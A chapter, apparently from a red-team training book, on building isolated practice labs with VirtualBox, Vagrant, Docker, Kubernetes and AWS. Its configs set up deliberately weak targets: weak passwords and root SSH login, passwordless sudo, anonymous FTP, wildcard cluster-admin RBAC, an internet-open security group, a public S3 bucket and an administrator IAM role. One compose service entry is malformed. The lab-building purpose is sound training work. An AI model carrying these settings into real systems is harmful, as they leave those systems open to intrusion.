# Chapter 28: Specialized Environments

## Introduction to Specialized Test Environments

Effective red team operations require testing environments that replicate real-world scenarios without the risk of disrupting production systems. While previous chapters have covered specialized tools for cloud, container, and IoT security assessment, this chapter focuses on creating secure, isolated, and realistic environments for practicing these techniques. By establishing specialized test environments, red team operators can develop and refine their skills, test new tools, and validate attack chains in a controlled context.

This chapter explores virtual labs, containerized environments, cloud-based practice platforms, and customized security testing ranges. We'll examine how to leverage Linux tools to create, manage, and automate these environments, providing a comprehensive approach to red team skill development and operational preparation.

![Specialized environments overview](./images/specialized_environments.png)
*Figure 28.1: Specialized testing environments and their relationships to red team operations*

## Virtual Lab Setup

Virtual machines provide an ideal foundation for red teaming labs, offering isolation, snapshot capabilities, and flexible networking. This section focuses on creating comprehensive red team environments using virtualization technologies available on Linux.

### Core Lab Infrastructure with VirtualBox

Oracle VirtualBox provides a free, cross-platform virtualization solution that's ideal for building comprehensive practice environments:

#### Installation and Configuration

```bash
# Install VirtualBox on Linux
sudo apt install virtualbox virtualbox-ext-pack

# Create a shared directory for lab resources
mkdir -p ~/redteam-lab/resources
```

#### Basic Lab Network Architecture

Create an isolated network for red team operations:

```bash
# Create a NAT Network
VBoxManage natnetwork add --netname RedTeamNet --network "10.0.0.0/24" --enable

# Configure DHCP
VBoxManage natnetwork modify --netname RedTeamNet --dhcp on
```

#### Virtual Machine Management Script

Create a management script for your lab environment:

```bash
#!/bin/bash
# redteam-lab-manager.sh
# Virtual Lab Management Script

LAB_DIR="$HOME/redteam-lab"
RESOURCES_DIR="$LAB_DIR/resources"
ISO_DIR="$LAB_DIR/iso"
VM_DIR="$HOME/VirtualBox VMs"

mkdir -p "$LAB_DIR" "$RESOURCES_DIR" "$ISO_DIR"

function create_vm() {
    local name=$1
    local os_type=$2
    local mem_size=$3
    local disk_size=$4
    
    echo "[+] Creating VM: $name"
    
    # Create VM
    VBoxManage createvm --name "$name" --ostype "$os_type" --register
    
    # Configure memory
    VBoxManage modifyvm "$name" --memory "$mem_size" --vram 32
    
    # Create and attach disk
    VBoxManage createmedium disk --filename "$VM_DIR/$name/$name.vdi" --size "$disk_size"
    VBoxManage storagectl "$name" --name "SATA Controller" --add sata --controller IntelAHCI
    VBoxManage storageattach "$name" --storagectl "SATA Controller" --port 0 --device 0 --type hdd --medium "$VM_DIR/$name/$name.vdi"
    
    # Add DVD drive
    VBoxManage storagectl "$name" --name "IDE Controller" --add ide
    
    # Network settings
    VBoxManage modifyvm "$name" --nic1 natnetwork --nat-network1 RedTeamNet
    
    echo "[+] VM $name created successfully"
}

function start_vm() {
    local name=$1
    local type=$2
    
    if [ "$type" = "headless" ]; then
        echo "[+] Starting VM $name (headless mode)"
        VBoxManage startvm "$name" --type headless
    else
        echo "[+] Starting VM $name"
        VBoxManage startvm "$name"
    fi
}

function stop_vm() {
    local name=$1
    
    echo "[+] Stopping VM $name"
    VBoxManage controlvm "$name" poweroff
}

function create_snapshot() {
    local vm_name=$1
    local snapshot_name=$2
    
    echo "[+] Creating snapshot $snapshot_name for VM $vm_name"
    VBoxManage snapshot "$vm_name" take "$snapshot_name" --description "Snapshot taken on $(date)"
}

function restore_snapshot() {
    local vm_name=$1
    local snapshot_name=$2
    
    echo "[+] Restoring snapshot $snapshot_name for VM $vm_name"
    VBoxManage snapshot "$vm_name" restore "$snapshot_name"
}

function setup_basic_lab() {
    echo "[+] Setting up basic red team lab environment"
    
    # Kali Linux Attack Machine
    create_vm "Kali-RedTeam" "Debian_64" 4096 80000
    
    # Target Machines
    create_vm "Target-Ubuntu" "Ubuntu_64" 2048 30000
    create_vm "Target-Windows" "Windows10_64" 4096 50000
    create_vm "Target-CentOS" "RedHat_64" 2048 30000
    
    # Create network services VM (DNS, DHCP, AD, etc.)
    create_vm "NetServices" "Windows2016_64" 3072 40000
    
    echo "[+] Basic lab setup complete"
    echo "[+] Next steps:"
    echo "    1. Mount installation ISOs and install operating systems"
    echo "    2. Configure networking for each VM"
    echo "    3. Install required services and tools"
}

function list_vms() {
    echo "[+] Available Virtual Machines:"
    VBoxManage list vms
    
    echo -e "\n[+] Running Virtual Machines:"
    VBoxManage list runningvms
}

# Main menu
function show_menu() {
    echo "==========================================="
    echo "        Red Team Lab Manager v1.0          "
    echo "==========================================="
    echo "1. Setup Basic Lab Environment"
    echo "2. Create Individual VM"
    echo "3. Start VM"
    echo "4. Stop VM"
    echo "5. Create Snapshot"
    echo "6. Restore Snapshot"
    echo "7. List Virtual Machines"
    echo "8. Exit"
    echo "==========================================="
    read -p "Select an option: " choice
    
    case $choice in
        1) setup_basic_lab ;;
        2) 
           read -p "VM Name: " vm_name
           read -p "OS Type (e.g., Ubuntu_64, Windows10_64): " os_type
           read -p "Memory Size (MB): " mem_size
           read -p "Disk Size (MB): " disk_size
           create_vm "$vm_name" "$os_type" "$mem_size" "$disk_size"
           ;;
        3) 
           read -p "VM Name: " vm_name
           read -p "Headless mode? (y/n): " headless
           if [ "$headless" = "y" ]; then
               start_vm "$vm_name" "headless"
           else
               start_vm "$vm_name" "normal"
           fi
           ;;
        4) 
           read -p "VM Name: " vm_name
           stop_vm "$vm_name"
           ;;
        5) 
           read -p "VM Name: " vm_name
           read -p "Snapshot Name: " snapshot_name
           create_snapshot "$vm_name" "$snapshot_name"
           ;;
        6) 
           read -p "VM Name: " vm_name
           read -p "Snapshot Name: " snapshot_name
           restore_snapshot "$vm_name" "$snapshot_name"
           ;;
        7) list_vms ;;
        8) exit 0 ;;
        *) echo "Invalid option" ;;
    esac
    
    read -p "Press Enter to continue..."
    show_menu
}

# Start the script
show_menu
```

Make the script executable and run it:

```bash
chmod +x redteam-lab-manager.sh
./redteam-lab-manager.sh
```

### Advanced Lab Configuration with Vagrant

Vagrant provides infrastructure as code for managing virtual machines, enabling reproducible lab environments:

#### Installation and Basic Setup

```bash
# Install Vagrant
sudo apt install vagrant

# Create a project directory
mkdir -p ~/vagrant-redteam-lab
cd ~/vagrant-redteam-lab
```

#### Creating a Multi-Machine Lab Environment

Create a Vagrantfile defining a complete lab:

```ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|
  # Common configuration
  config.vm.provider "virtualbox" do |vb|
    vb.gui = false
    vb.memory = "2048"
  end
  
  # Kali Linux - Attack Machine
  config.vm.define "kali" do |kali|
    kali.vm.box = "kalilinux/rolling"
    kali.vm.hostname = "kali"
    kali.vm.network "private_network", ip: "192.168.56.10"
    kali.vm.provider "virtualbox" do |vb|
      vb.memory = "4096"
      vb.cpus = 2
      vb.name = "RT-Kali"
    end
    kali.vm.provision "shell", inline: <<-SHELL
      apt-get update
      apt-get install -y metasploit-framework exploitdb nmap dirb
    SHELL
  end
  
  # Ubuntu Server - Target 1
  config.vm.define "ubuntu" do |ubuntu|
    ubuntu.vm.box = "ubuntu/focal64"
    ubuntu.vm.hostname = "ubuntu-target"
    ubuntu.vm.network "private_network", ip: "192.168.56.20"
    ubuntu.vm.provider "virtualbox" do |vb|
      vb.name = "RT-Ubuntu-Target"
    end
    ubuntu.vm.provision "shell", inline: <<-SHELL
      apt-get update
      apt-get install -y apache2 mysql-server php
      # Install deliberately vulnerable web application
      git clone https://github.com/OWASP/DVWA.git /var/www/html/dvwa
      chown -R www-data:www-data /var/www/html/dvwa
    SHELL
  end
  
  # CentOS - Target 2
  config.vm.define "centos" do |centos|
    centos.vm.box = "centos/8"
    centos.vm.hostname = "centos-target"
    centos.vm.network "private_network", ip: "192.168.56.30"
    centos.vm.provider "virtualbox" do |vb|
      vb.name = "RT-CentOS-Target"
    end
    centos.vm.provision "shell", inline: <<-SHELL
      yum -y update
      yum -y install httpd mariadb-server php
      systemctl enable httpd
      systemctl start httpd
      # Install outdated software for practice
      yum -y install vsftpd
      echo "anonymous_enable=YES" >> /etc/vsftpd/vsftpd.conf
      systemctl enable vsftpd
      systemctl start vsftpd
    SHELL
  end
  
  # Windows Target (if you have a Windows box)
  config.vm.define "windows" do |windows|
    windows.vm.box = "gusztavvargadr/windows-10"
    windows.vm.hostname = "windows-target"
    windows.vm.network "private_network", ip: "192.168.56.40"
    windows.vm.provider "virtualbox" do |vb|
      vb.memory = "4096"
      vb.name = "RT-Windows-Target"
    end
    # Windows-specific provisioning (using PowerShell)
    windows.vm.provision "shell", inline: <<-SHELL
      # Install vulnerable services for practice
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest -Uri "https://github.com/kohsuke/winsw/releases/download/v2.9.0/WinSW.NETCore31.x64.exe" -OutFile "C:\\Windows\\Temp\\service.exe"
    SHELL
  end
  
  # Network Services VM
  config.vm.define "netservices" do |ns|
    ns.vm.box = "ubuntu/focal64"
    ns.vm.hostname = "netservices"
    ns.vm.network "private_network", ip: "192.168.56.5"
    ns.vm.provider "virtualbox" do |vb|
      vb.name = "RT-NetServices"
    end
    ns.vm.provision "shell", inline: <<-SHELL
      apt-get update
      # Install DNS server
      apt-get install -y bind9 bind9utils
      # Install DHCP server
      apt-get install -y isc-dhcp-server
      # Basic configuration for DNS
      cat > /etc/bind/named.conf.local << EOF
zone "redteam.lab" {
    type master;
    file "/etc/bind/db.redteam.lab";
};
EOF
      cat > /etc/bind/db.redteam.lab << EOF
\$TTL    604800
@       IN      SOA     ns.redteam.lab. admin.redteam.lab. (
                              3         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
@       IN      NS      ns.redteam.lab.
@       IN      A       192.168.56.5
ns      IN      A       192.168.56.5
kali    IN      A       192.168.56.10
ubuntu  IN      A       192.168.56.20
centos  IN      A       192.168.56.30
windows IN      A       192.168.56.40
EOF
      # Restart services
      systemctl restart bind9
    SHELL
  end
end
```

#### Managing the Vagrant Lab

```bash
# Start the entire lab
vagrant up

# Start specific machines
vagrant up kali ubuntu

# SSH into a machine
vagrant ssh kali

# Snapshot management
vagrant snapshot save kali initial-state
vagrant snapshot restore kali initial-state

# Tear down the lab when done
vagrant destroy -f
```

### Network Segmentation and Traffic Capture

To create realistic network environments and capture traffic:

```bash
# Install bridge utilities
sudo apt install bridge-utils

# Create a bridge interface
sudo brctl addbr redteambridge
sudo ip addr add 192.168.56.1/24 dev redteambridge
sudo ip link set redteambridge up

# Configure VirtualBox to use the bridge
VBoxManage modifyvm "RT-Kali" --nic1 bridged --bridgeadapter1 redteambridge
VBoxManage modifyvm "RT-Ubuntu-Target" --nic1 bridged --bridgeadapter1 redteambridge

# Set up traffic capture
sudo apt install tcpdump
sudo tcpdump -i redteambridge -w capture.pcap
```

### Automating Lab Deployment with Ansible

Combine Vagrant with Ansible for more sophisticated lab automation:

```bash
# Install Ansible
sudo apt install ansible

# Create a playbook directory
mkdir -p ~/vagrant-redteam-lab/ansible
cd ~/vagrant-redteam-lab/ansible
```

Create an Ansible playbook for configuring target machines:

```yaml
# target-setup.yml
---
- name: Configure Ubuntu Target
  hosts: ubuntu
  become: yes
  tasks:
    - name: Update apt cache
      apt:
        update_cache: yes
        
    - name: Install vulnerable applications
      apt:
        name: "{{ item }}"
        state: present
      loop:
        - apache2
        - mysql-server
        - php
        - vsftpd
        
    - name: Download DVWA
      git:
        repo: https://github.com/OWASP/DVWA.git
        dest: /var/www/html/dvwa
        
    - name: Set permissions
      file:
        path: /var/www/html/dvwa
        owner: www-data
        group: www-data
        recurse: yes
        
    - name: Configure vsftpd for anonymous access
      lineinfile:
        path: /etc/vsftpd.conf
        line: "anonymous_enable=YES"
        
    - name: Create vulnerable user
      user:
        name: vulnerable
        password: "{{ 'password' | password_hash('sha512') }}"
        shell: /bin/bash
        
    - name: Set up weak SSH configuration
      lineinfile:
        path: /etc/ssh/sshd_config
        regexp: "{{ item.regexp }}"
        line: "{{ item.line }}"
      loop:
        - { regexp: '^#?PermitRootLogin', line: 'PermitRootLogin yes' }
        - { regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication yes' }
      notify: Restart SSH

  handlers:
    - name: Restart SSH
      service:
        name: ssh
        state: restarted
```

Update the Vagrantfile to use Ansible:

```ruby
# In your Vagrantfile
ubuntu.vm.provision "ansible" do |ansible|
  ansible.playbook = "ansible/target-setup.yml"
end
```

### Creating Vulnerable Applications for Practice

Deploy intentionally vulnerable applications for testing:

```bash
# Create a deployment script
cat > deploy-vulnerable-apps.sh << 'EOF'
#!/bin/bash
# Deploy vulnerable applications for practice

# DVWA
echo "[+] Deploying DVWA..."
sudo mkdir -p /var/www/html/dvwa
cd /tmp
git clone https://github.com/OWASP/DVWA.git
sudo cp -r DVWA/* /var/www/html/dvwa/
sudo chown -R www-data:www-data /var/www/html/dvwa

# Juice Shop
echo "[+] Deploying OWASP Juice Shop..."
cd /opt
sudo git clone https://github.com/bkimminich/juice-shop.git
cd juice-shop
sudo npm install
sudo npm start &

# Metasploitable 3
echo "[+] Downloading Metasploitable 3 for VirtualBox..."
cd ~/redteam-lab/resources
git clone https://github.com/rapid7/metasploitable3.git
cd metasploitable3
# Follow build instructions from README

echo "[+] Vulnerable applications deployed"
EOF

chmod +x deploy-vulnerable-apps.sh
```

> **RED TEAM TIP:**
>
> When creating virtual labs, take frequent snapshots of your machines at key configuration stages. This allows you to quickly restore to a known-good state after destructive testing, and to create multiple variants of the same base environment with different vulnerabilities and configurations for diverse testing scenarios.

## Containerized Security Testing Environments

Containers provide lightweight, fast-starting environments for security testing that can be defined as code and easily redistributed. This section explores container-based security testing environments with Docker and Kubernetes.

### Docker-Based Testing Environment

Docker offers efficient container-based environments that start quickly and consume fewer resources than full VMs:

#### Setting Up Docker Security Testing Infrastructure

```bash
# Install Docker
sudo apt update
sudo apt install -y docker.io docker-compose
sudo systemctl enable --now docker
sudo usermod -aG docker $USER
newgrp docker

# Create a directory for the testing environment
mkdir -p ~/docker-security-lab
cd ~/docker-security-lab
```

#### Creating a Test Network

```bash
# Create an isolated network for testing
docker network create --subnet=172.20.0.0/16 security-test-net
```

#### Building Vulnerable Test Environments

Create a Docker Compose file with various vulnerable services:

```yaml
# docker-compose.yml
version: '3'

services:
  # Vulnerable Web Application
  vulnerable-webapp:
    image: vulnerables/web-dvwa
    container_name: dvwa
    ports:
      - "8080:80"
    networks:
      security-test-net:
        ipv4_address: 172.20.0.10

  # Vulnerable API
    image: swaggerapi/petstore
    container_name: vulnerable-api
    ports:
      - "8081:8080"
    networks:
      security-test-net:
        ipv4_address: 172.20.0.11

  # Vulnerable Database
  mysql-vulnerable:
    image: mysql:5.7
    container_name: mysql-vulnerable
    environment:
      MYSQL_ROOT_PASSWORD: password
      MYSQL_DATABASE: vulnerable_db
    ports:
      - "3306:3306"
    networks:
      security-test-net:
        ipv4_address: 172.20.0.12

  # Vulnerable FTP Server
  ftp-vulnerable:
    image: stilliard/pure-ftpd
    container_name: ftp-vulnerable
    ports:
      - "21:21"
      - "30000-30009:30000-30009"
    environment:
      PUBLICHOST: "localhost"
      FTP_USER_NAME: ftpuser
      FTP_USER_PASS: ftppass
      FTP_USER_HOME: /home/ftpuser
    networks:
      security-test-net:
        ipv4_address: 172.20.0.13

  # Kali Linux for testing
  kali:
    image: kalilinux/kali-rolling
    container_name: kali-test
    tty: true
    stdin_open: true
    volumes:
      - ./shared:/shared
    networks:
      security-test-net:
        ipv4_address: 172.20.0.100
    command: /bin/bash

networks:
  security-test-net:
    external: true
```

#### Launching the Environment

```bash
# Start the environment
docker-compose up -d

# Access Kali container
docker exec -it kali-test /bin/bash

# Inside Kali container, install tools
apt update && apt install -y nmap metasploit-framework dirb sqlmap hydra
```

#### Creating Custom Vulnerable Containers

Build your own vulnerable containers for specific testing scenarios:

```dockerfile
# vulnerable-ssh.Dockerfile
FROM ubuntu:20.04

RUN apt-get update && \
    apt-get install -y openssh-server sudo && \
    mkdir /var/run/sshd

# Create vulnerable user with weak password
RUN useradd -m -s /bin/bash testuser && \
    echo "testuser:password" | chpasswd && \
    echo "testuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Configure weak SSH settings
RUN sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config

EXPOSE 22

CMD ["/usr/sbin/sshd", "-D"]
```

Build and run the custom container:

```bash
docker build -t vulnerable-ssh -f vulnerable-ssh.Dockerfile .
docker run -d --name ssh-test -p 2222:22 --network security-test-net vulnerable-ssh
```

#### Docker Security Testing Script

Create a script to manage your Docker security testing environment:

```bash
#!/bin/bash
# docker-security-lab.sh
# Docker Security Testing Environment Manager

COMPOSE_FILE="$HOME/docker-security-lab/docker-compose.yml"
LAB_DIR="$HOME/docker-security-lab"

function check_dependencies() {
    echo "[+] Checking dependencies..."
    if ! command -v docker &> /dev/null; then
        echo "[-] Docker not found. Please install Docker."
        exit 1
    fi
    if ! command -v docker-compose &> /dev/null; then
        echo "[-] Docker Compose not found. Please install Docker Compose."
        exit 1
    fi
}

function setup_environment() {
    echo "[+] Setting up Docker security testing environment..."
    mkdir -p "$LAB_DIR"
    cd "$LAB_DIR"
    
    # Create network if it doesn't exist
    if ! docker network inspect security-test-net &> /dev/null; then
        docker network create --subnet=172.20.0.0/16 security-test-net
    fi
    
    # Create docker-compose.yml if it doesn't exist
    if [ ! -f "$COMPOSE_FILE" ]; then
        cat > "$COMPOSE_FILE" << 'EOL'
version: '3'

services:
  # Vulnerable Web Application
  vulnerable-webapp:
    image: vulnerables/web-dvwa
    container_name: dvwa
    ports:
      - "8080:80"
    networks:
      security-test-net:
        ipv4_address: 172.20.0.10

  # Add more vulnerable services as needed...

  # Kali Linux for testing
  kali:
    image: kalilinux/kali-rolling
    container_name: kali-test
    tty: true
    stdin_open: true
    volumes:
      - ./shared:/shared
    networks:
      security-test-net:
        ipv4_address: 172.20.0.100
    command: /bin/bash

networks:
  security-test-net:
    external: true
EOL
    fi
    
    # Create shared directory
    mkdir -p "$LAB_DIR/shared"
    
    echo "[+] Environment setup complete."
}

function start_lab() {
    echo "[+] Starting security testing environment..."
    cd "$LAB_DIR"
    docker-compose up -d
    echo "[+] Lab started. Access points:"
    echo "    - DVWA: http://localhost:8080"
    echo "    - Kali: docker exec -it kali-test /bin/bash"
}

function stop_lab() {
    echo "[+] Stopping security testing environment..."
    cd "$LAB_DIR"
    docker-compose down
    echo "[+] Lab stopped."
}

function enter_kali() {
    echo "[+] Entering Kali container..."
    docker exec -it kali-test /bin/bash
}

function save_container_state() {
    local container_name=$1
    local image_name=$2
    
    echo "[+] Saving state of container $container_name as image $image_name..."
    docker commit "$container_name" "$image_name"
    echo "[+] Container state saved as image: $image_name"
}

function list_containers() {
    echo "[+] Running containers:"
    docker ps
}

function show_menu() {
    echo "=============================================="
    echo "      Docker Security Testing Lab Manager     "
    echo "=============================================="
    echo "1. Setup Environment"
    echo "2. Start Lab"
    echo "3. Stop Lab"
    echo "4. Enter Kali Container"
    echo "5. Save Container State"
    echo "6. List Running Containers"
    echo "7. Exit"
    echo "=============================================="
    read -p "Select an option: " choice
    
    case $choice in
        1) setup_environment ;;
        2) start_lab ;;
        3) stop_lab ;;
        4) enter_kali ;;
        5) 
           read -p "Container name: " container_name
           read -p "Image name: " image_name
           save_container_state "$container_name" "$image_name"
           ;;
        6) list_containers ;;
        7) exit 0 ;;
        *) echo "Invalid option" ;;
    esac
    
    read -p "Press Enter to continue..."
    show_menu
}

# Main
check_dependencies
show_menu
```

### Kubernetes-Based Security Range

For more complex scenarios, Kubernetes provides a platform for realistic security testing:

#### Setting Up a Local Kubernetes Cluster

```bash
# Install minikube for local Kubernetes
sudo apt install -y virtualbox
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube

# Install kubectl
sudo apt-get update && sudo apt-get install -y apt-transport-https
curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -
echo "deb https://apt.kubernetes.io/ kubernetes-xenial main" | sudo tee -a /etc/apt/sources.list.d/kubernetes.list
sudo apt-get update
sudo apt-get install -y kubectl

# Start minikube
minikube start --driver=virtualbox
```

#### Deploying Vulnerable Applications

Create a vulnerable application deployment:

```yaml
# vulnerable-k8s.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: security-testing
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-webapp
  namespace: security-testing
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vulnerable-webapp
  template:
    metadata:
      labels:
        app: vulnerable-webapp
    spec:
      containers:
      - name: dvwa
        image: vulnerables/web-dvwa
        ports:
        - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-webapp
  namespace: security-testing
spec:
  selector:
    app: vulnerable-webapp
  ports:
  - port: 80
    targetPort: 80
  type: NodePort
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: kali-deployment
  namespace: security-testing
spec:
  replicas: 1
  selector:
    matchLabels:
      app: kali
  template:
    metadata:
      labels:
        app: kali
    spec:
      containers:
      - name: kali
        image: kalilinux/kali-rolling
        command: ["/bin/bash", "-c", "--"]
        args: ["while true; do sleep 30; done;"]
```

#### Deploying and Accessing the Environment

```bash
# Apply the configuration
kubectl apply -f vulnerable-k8s.yaml

# Get service URL
minikube service vulnerable-webapp -n security-testing --url

# Access Kali pod
kubectl -n security-testing exec -it $(kubectl -n security-testing get pods -l app=kali -o name) -- /bin/bash

# Inside Kali, install tools
apt update && apt install -y nmap metasploit-framework dirb
```

#### Creating a Vulnerable Kubernetes Environment

For more realistic scenarios, create configurations with deliberate misconfigurations:

```yaml
# vulnerable-rbac.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: vulnerable-service-account
  namespace: security-testing
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: vulnerable-cluster-role
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: vulnerable-binding
subjects:
- kind: ServiceAccount
  name: vulnerable-service-account
  namespace: security-testing
roleRef:
  kind: ClusterRole
  name: vulnerable-cluster-role
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-pod
  namespace: security-testing
spec:
  serviceAccountName: vulnerable-service-account
  containers:
  - name: vulnerable-container
    image: ubuntu:20.04
    command: ["/bin/bash", "-c", "--"]
    args: ["while true; do sleep 30; done;"]
```

Apply this configuration:

```bash
kubectl apply -f vulnerable-rbac.yaml
```

> **RED TEAM TIP:**
>
> When creating containerized testing environments, build layers of complexity that match your target environments. Start with simple containers for basic testing, then progress to orchestrated environments with service meshes, authorization systems, and monitoring to practice evading detection in realistic scenarios.

## Cloud-Based Practice Platforms

Cloud environments provide scalable, on-demand platforms for security testing with diverse technologies and realistic scenarios. This section explores creating and managing cloud-based security practice environments.

### AWS Security Testing Environment

Amazon Web Services (AWS) offers extensive services for creating realistic security testing platforms:

#### Setting Up Basic AWS Environment

```bash
# Install AWS CLI
sudo apt install -y awscli
aws configure

# Create directory for AWS lab resources
mkdir -p ~/aws-security-lab
cd ~/aws-security-lab
```

#### CloudFormation Template for Vulnerable Lab

Create a CloudFormation template for a vulnerable practice environment:

```yaml
# vulnerable-lab.yaml
AWSTemplateFormatVersion: '2010-09-09'
Description: 'Red Team Practice Environment'

Resources:
  # VPC Configuration
  SecurityLabVPC:
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: 10.0.0.0/16
      EnableDnsSupport: true
      EnableDnsHostnames: true
      Tags:
        - Key: Name
          Value: RedTeamLabVPC

  # Subnet configuration
  PublicSubnet:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId: !Ref SecurityLabVPC
      CidrBlock: 10.0.1.0/24
      MapPublicIpOnLaunch: true
      Tags:
        - Key: Name
          Value: PublicSubnet

  # Internet Gateway
  InternetGateway:
    Type: AWS::EC2::InternetGateway
    Properties:
      Tags:
        - Key: Name
          Value: RedTeamLabIGW

  # Attach Gateway to VPC
  AttachGateway:
    Type: AWS::EC2::VPCGatewayAttachment
    Properties:
      VpcId: !Ref SecurityLabVPC
      InternetGatewayId: !Ref InternetGateway

  # Route Table Configuration
  PublicRouteTable:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref SecurityLabVPC
      Tags:
        - Key: Name
          Value: PublicRouteTable

  PublicRoute:
    Type: AWS::EC2::Route
    DependsOn: AttachGateway
    Properties:
      RouteTableId: !Ref PublicRouteTable
      DestinationCidrBlock: 0.0.0.0/0
      GatewayId: !Ref InternetGateway

  PublicSubnetRouteTableAssociation:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      SubnetId: !Ref PublicSubnet
      RouteTableId: !Ref PublicRouteTable

  # Security Group - Deliberately vulnerable
  VulnerableSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupDescription: Vulnerable security group for testing
      VpcId: !Ref SecurityLabVPC
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 0
          ToPort: 65535
          CidrIp: 0.0.0.0/0
        - IpProtocol: udp
          FromPort: 0
          ToPort: 65535
          CidrIp: 0.0.0.0/0
        - IpProtocol: icmp
          FromPort: -1
          ToPort: -1
          CidrIp: 0.0.0.0/0

  # Vulnerable EC2 Instance
  VulnerableInstance:
    Type: AWS::EC2::Instance
    Properties:
      InstanceType: t2.micro
      SecurityGroupIds:
        - !Ref VulnerableSecurityGroup
      SubnetId: !Ref PublicSubnet
      ImageId: ami-0c55b159cbfafe1f0  # Amazon Linux 2 (adjust for your region)
      Tags:
        - Key: Name
          Value: VulnerableTarget
      UserData:
        Fn::Base64: !Sub |
          #!/bin/bash
          yum update -y
          yum install -y httpd mysql mariadb-server php
          systemctl start httpd
          systemctl enable httpd
          # Download and install DVWA
          cd /var/www/html
          wget https://github.com/ethicalhack3r/DVWA/archive/master.zip
          unzip master.zip
          mv DVWA-master dvwa
          rm master.zip
          chown -R apache:apache dvwa

  # IAM Role with excessive permissions
  VulnerableRole:
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              Service: ec2.amazonaws.com
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AdministratorAccess

  # S3 Bucket with public access
  VulnerableS3Bucket:
    Type: AWS::S3::Bucket
    Properties:
      AccessControl: PublicRead
      BucketName: !Sub "vulnerable-bucket-${AWS::AccountId}"

Outputs:
  VulnerableInstanceIP:
    Description: Public IP address of the vulnerable instance
    Value: !GetAtt VulnerableInstance.PublicIp
  VulnerableS3Bucket:
    Description: Name of the vulnerable S3 bucket
    Value: !Ref VulnerableS3Bucket
```

#### Deploying and Managing the AWS Lab

```bash
# Deploy the stack
aws cloudformation create-stack --stack-name RedTeamLab --template-body file://vulnerable-lab.yaml --capabilities CAPABILITY_IAM

# Check deployment status
aws cloudformation describe-stacks --stack-name RedTeamLab

# Get outputs (including instance IP)
aws cloudformation describe-stacks --stack-name RedTeamLab --query "Stacks[0].Outputs"
```

#### AWS Security Testing Script

Create a management script for your AWS lab:

```bash
#!/bin/bash
# aws-security-lab-manager.sh
# AWS Security Testing Lab Manager

STACK_NAME="RedTeamLab"
TEMPLATE_FILE="$HOME/aws-security-lab/vulnerable-lab.yaml"

function check_aws_cli() {
    if ! command -v aws &> /dev/null; then
        echo "[-] AWS CLI not found. Please install it."
        exit 1
    fi
    
    if ! aws sts get-caller-identity &> /dev/null; then
        echo "[-] AWS CLI not configured. Please run 'aws configure'."
        exit 1
    fi
}

function deploy_lab() {
    echo "[+] Deploying AWS security testing lab..."
    aws cloudformation create-stack \
        --stack-name $STACK_NAME \
        --template-body file://$TEMPLATE_FILE \
        --capabilities CAPABILITY_IAM
    
    echo "[+] Deployment initiated. Checking status..."
    aws cloudformation wait stack-create-complete --stack-name $STACK_NAME
    
    if [ $? -eq 0 ]; then
        echo "[+] Deployment complete!"
        get_lab_info
    else
        echo "[-] Deployment failed. Check CloudFormation console for details."
    fi
}

function get_lab_info() {
    echo "[+] Security Lab Information:"
    aws cloudformation describe-stacks \
        --stack-name $STACK_NAME \
        --query "Stacks[0].Outputs" \
        --output table
}

function destroy_lab() {
    echo "[+] Destroying AWS security testing lab..."
    aws cloudformation delete-stack --stack-name $STACK_NAME
    
    echo "[+] Waiting for deletion to complete..."
    aws cloudformation wait stack-delete-complete --stack-name $STACK_NAME
    
    if [ $? -eq 0 ]; then
        echo "[+] Lab environment destroyed successfully."
    else
        echo "[-] Issue with lab destruction. Check CloudFormation console."
    fi
}

function check_lab_status() {
    echo "[+] Checking lab status..."
    status=$(aws cloudformation describe-stacks --stack-name $STACK_NAME --query "Stacks[0].StackStatus" --output text 2>/dev/null)
    
    if [ $? -eq 0 ]; then
        echo "[+] Lab status: $status"
    else
        echo "[+] Lab is not currently deployed."
    fi
}

function show_menu() {
    echo "=============================================="
    echo "      AWS Security Testing Lab Manager        "
    echo "=============================================="
    echo "1. Deploy Lab Environment"
    echo "2. Check Lab Status"
    echo "3. Get Lab Information"
    echo "4. Destroy Lab Environment"
    echo "5. Exit"
    echo "=============================================="
    read -p "Select an option: " choice
    
    case $choice in
        1) deploy_lab ;;
        2) check_lab_status ;;
        3) get_lab_info ;;
        4) destroy_lab ;;
        5) exit 0 ;;
        *) echo "Invalid option" ;;
    esac
    
    read -p "Press Enter to continue..."
    show_menu
}

# Main
check_aws_cli
show_menu
```

### GCP Security Testing Environment

Google Cloud Platform (GCP) provides another platform for security testing:

#### Setting Up Basic GCP Environment

```bash
# Install gcloud CLI
